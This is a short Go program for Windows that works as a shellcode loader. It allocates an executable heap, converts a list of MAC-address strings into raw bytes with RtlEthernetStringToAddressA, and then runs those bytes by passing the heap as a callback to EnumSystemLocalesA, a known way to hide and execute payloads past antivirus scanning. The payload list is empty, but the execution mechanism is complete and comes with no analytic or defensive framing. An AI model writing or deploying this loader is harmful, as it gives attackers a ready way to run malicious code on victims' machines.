package main

import (
	"syscall"
	"unsafe"
)

var kernel32 = syscall.NewLazyDLL("Kernel32.dll")
var HeapCreate = kernel32.NewProc("HeapCreate")
var HeapAlloc = kernel32.NewProc("HeapAlloc")
var HEAP_CREATE_ENABLE_EXECUTE uintptr = 0x00040000
var HEAP_ZERO_MEMORY uintptr = 0x00000008
var Ntdll = syscall.NewLazyDLL("ntdll.dll")
var EnumSystemLocalesA = kernel32.NewProc("EnumSystemLocalesA")

func MacToMemory(Mac []string){
	Heap,_,_ := HeapCreate.Call(HEAP_CREATE_ENABLE_EXECUTE|HEAP_ZERO_MEMORY,0,0)
	HeapAddr,_,_ := HeapAlloc.Call(Heap,0,0x00100000)

	HeapPtr := HeapAddr
	for _,Ma := range Mac{
		Mc := append([]byte(Ma),0)
		Ntdll.NewProc("RtlEthernetStringToAddressA").Call(uintptr(unsafe.Pointer(&Mc[0])),uintptr(unsafe.Pointer(&Mc[0])),HeapPtr)
		HeapPtr += 6
	}
	EnumSystemLocalesA.Call(HeapAddr,0)
}


func main(){
	Mac := []string{""}
	MacToMemory(Mac)
}